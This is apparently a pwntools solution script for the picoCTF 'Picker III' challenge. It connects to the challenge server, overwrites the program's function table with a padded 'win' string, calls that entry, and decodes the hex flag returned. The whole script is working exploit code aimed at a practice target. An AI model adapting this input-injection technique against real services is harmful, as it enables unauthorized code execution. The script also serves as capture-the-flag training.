from pwn import *

HOST, PORT = 'saturn.picoctf.net', 53312
r = remote(HOST, PORT)
# r = process(['python3', 'picker-III.py'])

r.sendline('3')
r.sendlineafter('write: ', 'func_table')
r.sendlineafter('variable: ', f'"{"win".ljust(32*4, ' ')}"')
r.sendline('1')
r.recvuntil('==> ')
flag = r.recvline().strip().decode().split()
print(''.join([chr(int(x, 16)) for x in flag]))
r.interactive()